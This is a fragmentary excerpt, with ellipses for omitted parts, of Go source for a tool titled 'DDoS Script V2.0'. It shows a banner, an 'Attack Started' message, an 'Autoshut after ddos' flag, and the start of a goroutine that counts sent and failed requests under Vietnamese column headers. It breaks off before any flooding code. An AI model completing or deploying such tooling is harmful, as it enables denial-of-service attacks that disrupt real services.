...
func main() {
	...
	flag.BoolVar(&safe, "safe", false, "Autoshut after ddos")
	...
	cmd := exec.Command("cmd", "/c", "color a")
	...
	fmt.Println(" ╚██████╔╝  ╚████╔╝  ███████╗ ██║  ██║    ██║  ██╗ ██║ ███████╗ ███████╗")
	fmt.Println("  ╚═════╝    ╚═══╝   ╚══════╝ ╚═╝  ╚═╝    ╚═╝  ╚═╝ ╚═╝ ╚══════╝ ╚══════╝")
	fmt.Println("\033[36m   DDoS Script V2.0\n")
	...
	go func() {
		fmt.Println("\n\033[31m--- Attack Started ---\n")
		ss := make(chan uint8, 8)
		var (
			err, sent int32
		)
		fmt.Println("\033[97m        Tiến độ      |\tThành công |\t   Lỗi")
		for {
